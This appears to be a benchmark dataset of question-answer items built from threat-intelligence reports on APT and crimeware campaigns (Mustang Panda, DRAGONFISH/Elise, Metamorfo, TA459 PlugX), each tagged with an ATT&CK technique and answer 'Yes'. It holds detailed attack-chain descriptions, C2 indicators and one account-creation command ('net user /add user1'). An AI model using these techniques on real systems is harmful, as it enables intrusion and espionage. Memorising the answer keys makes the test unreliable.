2435,4,4-Command and Control-T1105-Ingress Tool Transfer,"After Mustang Panda gains initial access using phishing lures related to official European Union and Ukrainian government reports, is it likely that they will execute malware via DLL side-loading with benign executables before employing stagers to download additional shellcode for execution during command and control?","Command and Control: Mustang Panda's command and control techniques involved the use of downloaders that fetched various infection artifacts, leading to the deployment of the PlugX implant. They also used stagers that downloaded additional shellcode from a C2 IP address, which was then executed on the infected endpoint.","Initial Access: In February 2022, Cisco Talos observed Mustang Panda, a China-based threat actor, initiating phishing campaigns against European entities, including Russian organizations. The phishing emails contained malicious lures disguised as official European Union reports on the conflict in Ukraine and its effects on NATO countries, as well as fake Ukrainian government reports, which upon interaction, downloaded malware onto the victims' machines.
Execution: Mustang Panda employed various methods to execute their malware. They used benign executables to side-load malicious DLLs, which acted as loaders for the PlugX implant. The group also deployed custom stagers, meterpreter-based shellcode downloaders, and reverse shells. These methods were used to establish long-term persistence on infected endpoints for espionage purposes.
Persistence: Mustang Panda's tactics for maintaining persistence included the use of benign executables that loaded malicious DLLs, which in turn activated the PlugX RAT implant. They also used stagers and reverse shells to ensure continued access to compromised systems. The group utilized scheduled tasks and registry modifications to maintain their foothold.
Others: Mustang Panda, also known as RedDelta or Bronze President, has been active since at least 2012, targeting entities worldwide, including government organizations, think tanks, NGOs, and religious institutions. The group has extensively targeted Asian countries, such as the Taiwanese government, Hong Kong activists, NGOs in Mongolia and Tibet, and telecommunication firms in Myanmar and India. They have evolved their tactics and implants over the years to conduct espionage and information theft, using summit- and conference-themed lures in Asia and Europe. The group has also continuously evolved its delivery mechanisms, including maldocs, shortcut files, malicious archives, and downloaders. Cisco Talos Intelligence Group provides various solutions to detect and block threats from Mustang Panda.",Yes,Cisco Talos Intelligence Group - Comprehensive Threat Intelligence_ Mustang Panda deploys a new wave of malware targeting Europe
2440,40,40-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After injecting the NavShExt.dll into the Internet Explorer process and creating a mutex named 'donotbotherme' to prevent duplicate executions, is it likely that the Elise malware will employ defense evasion techniques such as heavy anti-virtual-machine features and obfuscation while exfiltrating data to the C2 server?","Defense Evasion: The malware employs various defense evasion techniques, including heavy anti-virtual-machine features, obfuscation techniques to exfiltrate data to the C2 server using base64-encoded cookie values, and spoofing the host to query non-existing domains to mislead malware analysts or network administrators. Debug paths are completely stripped from the malware.","Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.
Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",Yes,Accenture-Security-Dragonfish-Threat-Analysis
2445,40,40-Discovery-T1057-Process Discovery,"After distributing a malicious Microsoft Word document to facilitate initial access, is it likely that the Elise malware will enumerate running processes as part of its discovery phase before attempting to achieve persistence through the Run Registry key with the value name IAStorD?","Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.","Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Defense Evasion: The malware employs various defense evasion techniques, including heavy anti-virtual-machine features, obfuscation techniques to exfiltrate data to the C2 server using base64-encoded cookie values, and spoofing the host to query non-existing domains to mislead malware analysts or network administrators. Debug paths are completely stripped from the malware.
Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",Yes,Accenture-Security-Dragonfish-Threat-Analysis
2446,40,40-Discovery-T1083-File and Directory Discovery,"After achieving persistence using the Run Registry key with the value name IAStorD and injecting hidden DLLs into the Internet Explorer process, is DRAGONFISH likely to harvest a list of all files present on the user's desktop to gather directory information?","Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.","Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Defense Evasion: The malware employs various defense evasion techniques, including heavy anti-virtual-machine features, obfuscation techniques to exfiltrate data to the C2 server using base64-encoded cookie values, and spoofing the host to query non-existing domains to mislead malware analysts or network administrators. Debug paths are completely stripped from the malware.
Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",Yes,Accenture-Security-Dragonfish-Threat-Analysis
2454,400,400-Discovery-T1518-Software Discovery,"After using public cloud infrastructure to deliver malicious payloads for evasion and creating registry keys in Software\Microsoft\Windows\CurrentVersion\Run for persistence, is it likely that the banking Trojan will search for antivirus and banking software on the victim's system as part of its discovery phase?","Discovery: The banking Trojan would search for folders related to antivirus software and banking software on the victim's system. It would also collect information about the hostname and operating system version, which was sent to a hardcoded domain using a hardcoded User-Agent string.","Initial Access: The Metamorfo campaigns began with phishing emails containing HTML attachments that redirected victims to cloud storage sites like GitHub, Dropbox, or Google Drive to download a ZIP file containing a malicious executable. This executable, when run, would continue the infection chain.
Execution: The malicious executable from the initial access stage was an HTA script compiled into an executable that, when run, would execute a malicious HTA file extracted to %temp% and run by mshta.exe. This HTA script contained VBS code that fetched additional VBS code encoded in base64 from a remote server, which then downloaded the final payload, a banking Trojan, from another remote server.
Persistence: Persistence was achieved by creating registry keys in Software\Microsoft\Windows\CurrentVersion\Run using a string extracted from a file named car.dat. Additionally, a VBS script capable of recreating the infection chain was set to persist and download the same ZIP archive.
Defense Evasion: The campaigns utilized various techniques to evade detection, including the use of public cloud infrastructure to deliver stages of the malicious payload and the abuse of legitimate signed binaries to load malicious code.
Collection: The malware captured screenshots and mouse clicks while the user was browsing banking sites. These screenshots were saved as .jpg images in a specific directory.
Command and Control: The C2 server was selected based on a string in a file named 'id'. The malware communicated with the C2 server over raw TCP on port 9999, following a specific command pattern. The C2 server's infrastructure revealed the number of potential victims for the campaign.
Others: The Metamorfo campaigns targeted Brazilian users with banking Trojans delivered through malspam. The campaigns were notable for their multi-stage infection chains and the use of cloud storage sites to host malicious payloads. The attackers also used legitimate Windows tools for DLL side-loading and employed various evasion techniques. The campaigns were analyzed by FireEye Labs, which provided insights into the tactics and techniques used by the attackers.",Yes,metamorfo-campaign-targeting-brazilian-users_html
2455,400,400-Discovery-T1082-System Information Discovery,"After the banking Trojan achieved persistence by creating registry keys in Software\Microsoft\Windows\CurrentVersion\Run and setting a VBS script to recreate the infection chain, is it likely that the Trojan would search for folders related to antivirus and banking software and then proceed to collect information about the hostname and operating system version of the victim's system?","Discovery: The banking Trojan would search for folders related to antivirus software and banking software on the victim's system. It would also collect information about the hostname and operating system version, which was sent to a hardcoded domain using a hardcoded User-Agent string.","Initial Access: The Metamorfo campaigns began with phishing emails containing HTML attachments that redirected victims to cloud storage sites like GitHub, Dropbox, or Google Drive to download a ZIP file containing a malicious executable. This executable, when run, would continue the infection chain.
Execution: The malicious executable from the initial access stage was an HTA script compiled into an executable that, when run, would execute a malicious HTA file extracted to %temp% and run by mshta.exe. This HTA script contained VBS code that fetched additional VBS code encoded in base64 from a remote server, which then downloaded the final payload, a banking Trojan, from another remote server.
Persistence: Persistence was achieved by creating registry keys in Software\Microsoft\Windows\CurrentVersion\Run using a string extracted from a file named car.dat. Additionally, a VBS script capable of recreating the infection chain was set to persist and download the same ZIP archive.
Defense Evasion: The campaigns utilized various techniques to evade detection, including the use of public cloud infrastructure to deliver stages of the malicious payload and the abuse of legitimate signed binaries to load malicious code.
Collection: The malware captured screenshots and mouse clicks while the user was browsing banking sites. These screenshots were saved as .jpg images in a specific directory.
Command and Control: The C2 server was selected based on a string in a file named 'id'. The malware communicated with the C2 server over raw TCP on port 9999, following a specific command pattern. The C2 server's infrastructure revealed the number of potential victims for the campaign.
Others: The Metamorfo campaigns targeted Brazilian users with banking Trojans delivered through malspam. The campaigns were notable for their multi-stage infection chains and the use of cloud storage sites to host malicious payloads. The attackers also used legitimate Windows tools for DLL side-loading and employed various evasion techniques. The campaigns were analyzed by FireEye Labs, which provided insights into the tactics and techniques used by the attackers.",Yes,metamorfo-campaign-targeting-brazilian-users_html
2457,400,400-Collection-T1113-Screen Capture,"After the banking Trojan searches for folders related to antivirus and banking software and collects system information, is it likely that the malware will capture screenshots and mouse clicks while the user browses banking sites, save these screenshots as .jpg images, and store them in a specific directory?",Collection: The malware captured screenshots and mouse clicks while the user was browsing banking sites. These screenshots were saved as .jpg images in a specific directory.,"Initial Access: The Metamorfo campaigns began with phishing emails containing HTML attachments that redirected victims to cloud storage sites like GitHub, Dropbox, or Google Drive to download a ZIP file containing a malicious executable. This executable, when run, would continue the infection chain.
Execution: The malicious executable from the initial access stage was an HTA script compiled into an executable that, when run, would execute a malicious HTA file extracted to %temp% and run by mshta.exe. This HTA script contained VBS code that fetched additional VBS code encoded in base64 from a remote server, which then downloaded the final payload, a banking Trojan, from another remote server.
Persistence: Persistence was achieved by creating registry keys in Software\Microsoft\Windows\CurrentVersion\Run using a string extracted from a file named car.dat. Additionally, a VBS script capable of recreating the infection chain was set to persist and download the same ZIP archive.
Defense Evasion: The campaigns utilized various techniques to evade detection, including the use of public cloud infrastructure to deliver stages of the malicious payload and the abuse of legitimate signed binaries to load malicious code.
Discovery: The banking Trojan would search for folders related to antivirus software and banking software on the victim's system. It would also collect information about the hostname and operating system version, which was sent to a hardcoded domain using a hardcoded User-Agent string.
Command and Control: The C2 server was selected based on a string in a file named 'id'. The malware communicated with the C2 server over raw TCP on port 9999, following a specific command pattern. The C2 server's infrastructure revealed the number of potential victims for the campaign.
Others: The Metamorfo campaigns targeted Brazilian users with banking Trojans delivered through malspam. The campaigns were notable for their multi-stage infection chains and the use of cloud storage sites to host malicious payloads. The attackers also used legitimate Windows tools for DLL side-loading and employed various evasion techniques. The campaigns were analyzed by FireEye Labs, which provided insights into the tactics and techniques used by the attackers.",Yes,metamorfo-campaign-targeting-brazilian-users_html
2468,404,404-Defense Evasion-T1036-Masquerading,"Is it likely that the attack initiated by sending a PDF attachment that passed through security filters and appeared benign, before evading detection by using legitimate tools and scripts for its operations?","Defense Evasion: The attack evaded detection by using legitimate tools and scripts without any malicious activity, avoiding behavior-based detectors. It remained undetected for almost six months.","Initial Access: An email with a seemingly innocuous PDF attachment was sent to Susan, a secretary at Black Gold. The PDF, which passed through all security filters, was actually an executable file disguised as a document, initiating the attack when opened.
Execution: The executable file created a folder and extracted six files, running 'stat.vbs' which in turn executed 'deca.bat'. This batch file opened a blank PDF and ran 'dcp.exe', a file encryption tool, to decrypt two files and extract the contents of 'bare.zip' into a different folder. The 'sai.vbs' script was then executed.
Persistence: The attack modified the Windows registry to ensure 'aagi.bat' ran at system start, and used legitimate applications to collect credentials, renaming them to indicate the time of collection. It also configured an application to run another batch file every hour to maintain its operations.
Credential Access: Legitimate applications were used to collect credentials from local mail clients and Internet browsers, saving them to text files. These credentials were then uploaded to an external FTP server controlled by the attackers.
Collection: The attack collected credentials recurrently every hour, resulting in over 80,000 text files with stolen credentials from various firms, all within the oil and gas maritime transportation sector.
Command and Control: The attack used an FTP command to upload stolen credentials to an external server, and the 'iei.bat' file was run every hour to manage the collection and transmission of the data.
Exfiltration: Stolen credentials were exfiltrated to an FTP server, with the oldest files dating back to August 2013, indicating the long-term undetected nature of the attack.
Others: The attack, dubbed 'Phantom Menace', targeted companies in the oil and gas maritime transportation sector. It was linked to a scam involving fake oil deals, where stolen credentials were likely used to forge documents for fraudulent transactions. The attackers appeared to be based in Nigeria, with connections to Ikeja, known as the 'Computer Village'. Despite the evidence, victims were unwilling to report the crime, hindering police investigations. The case highlights the need for companies to perform regular audits and implement new protection strategies for network security.",Yes,oil-tanker-en
2470,405,405-Initial Access-T1566-Phishing,"Before the adversaries exploited the Microsoft Office vulnerability (CVE-2021-40444) through spear phishing emails to gain initial access, is it likely that they acquired domains such as wordkeyvpload[.]net and tools like Empire to support the attack?",Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.,"Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2472,405,405-Persistence-T1547-Boot or Logon Autostart Execution,"After abusing PowerShell for the execution of the Empire stager, is it likely that the adversaries will establish persistence by executing malicious content triggered by hijacked references to COM objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D) before concealing execution of malicious payloads through reflective code loading?",Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.,"Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2473,405,405-Persistence-T1136-Create Account,"After exploiting the CVE-2021-40444 vulnerability for client execution and abusing PowerShell for the execution of the Empire stager, is it likely that the attackers created a local account to maintain access to victim systems before using reflective code loading to evade defenses?",Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.,"Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2475,405,405-Execution-T1203-Exploitation for Client Execution,"After acquiring domains for command and control and developing Graphite malware during resource development, is it likely that the attackers exploited the CVE-2021-40444 vulnerability for client execution before establishing persistence through hijacked Component Object Model (COM) references?",Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.,"Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2476,405,405-Execution-T1059-Command and Scripting Interpreter,"After the attackers acquired domains to be used as command and control servers and developed malicious components including the Graphite malware, is it likely that they exploited a vulnerability in Microsoft Office (CVE-2021-40444) for client execution before using PowerShell to execute the Empire stager?",Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.,"Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2477,405,405-Command and Control-T1104-Multi-Stage Channels,"After employing reflective code loading with the Empire DLL Launcher stager to evade defenses, is it likely that the adversaries will use Empire stagers to create multiple stages for obfuscating the command-and-control channel?","Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.","Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2478,405,405-Command and Control-T1573-Encrypted Channel,"After gaining persistence through creating a local account and hijacking references to Component Object Model (COM) objects, is it likely that the adversaries used Empire stagers for encrypted communication in the command-and-control stage?","Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.","Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.
Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2480,405,405-Resource Development-T1583-Acquire Infrastructure,"After initiating the attack by sending spear phishing emails with malicious attachments exploiting CVE-2021-40444 to execute code on victim systems, is it likely that the attackers acquired infrastructure such as domains to serve as command and control servers during resource development?","Resource Development: Resource Development: The attackers acquired infrastructure such as domains (wordkeyvpload[.]net, wordkeyvpload[.]org) and developed capabilities including malware (Graphite malware) and tools (Empire). These resources were used to support the operation, with domains purchased to serve as command and control servers, malicious components built to conduct the attack, and red teaming tools employed.","Initial Access: Initial Access: The adversaries initiated the attack by sending spear phishing emails with a malicious attachment (BM-D(2021)0247.xlsx) to gain access to victim systems. They exploited a vulnerability in Microsoft Office (CVE-2021-40444) to execute code on the victim's machine.
Execution: Execution: The adversaries exploited the CVE-2021-40444 vulnerability for client execution and abused PowerShell (Empire PowerShell stager) for the execution of the Empire stager.
Persistence: Persistence: The adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects (CLSID: D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D). They also created a local account (net user /add user1) to maintain access to victim systems.
Defense Evasion: Defense Evasion: The adversaries used reflective code loading (Empire DLL Launcher stager) to conceal the execution of malicious payloads.
Command and Control: Command and Control: The adversaries created multiple stages to obfuscate the command-and-control channel (use of different Empire stagers) and used an existing, legitimate external web service (Microsoft OneDrive, Empire Server) for bidirectional communication. They also employed symmetric (AES 256) and asymmetric encryption to conceal command and control traffic.",Yes,Prime Minister’s Office Compromised_ Details of Recent Espionage Campaign
2484,406,406-Execution-T1059-Command and Scripting Interpreter,"After spear-phishing emails with Russian-language exploit-laden Microsoft Word documents or RAR archives containing the PlugX RAT are used to gain initial access, is it likely that the RAR SFX executables will drop the PlugX malware before the malware establishes persistence through service and run key installation?","Execution: The PlugX RAT was delivered via spear-phishing emails using Microsoft Word document attachments exploiting CVE-2012-0158 or RAR archives from fake domains. The RAR SFX executables dropped and loaded PlugX, employing DLL side-loading techniques to load the payload. The clean signed executable 'fsguidll.exe' was used to sideload 'fslapi.dll', which unpacked code from 'fslapi.dll.gui'. The variant of PlugX used was the P2P version, which included a range of features such as keylogging, screenshots, and persistence through service and run key installation.","Initial Access: Proofpoint researchers observed a campaign targeting telecom and military sectors in Russia, which began in July 2015 and continued into August. The campaign involved spear-phishing emails with exploit-laden Microsoft Word document attachments and links leading to RAR archives containing the PlugX Remote Access Trojan (RAT). The emails and attachments were crafted in Russian, with filenames and decoy content relevant to the targets' interests, such as telecom terms and military events. The attackers, believed to operate out of China and tracked as TA459, have previously targeted military installations in Central Asia.
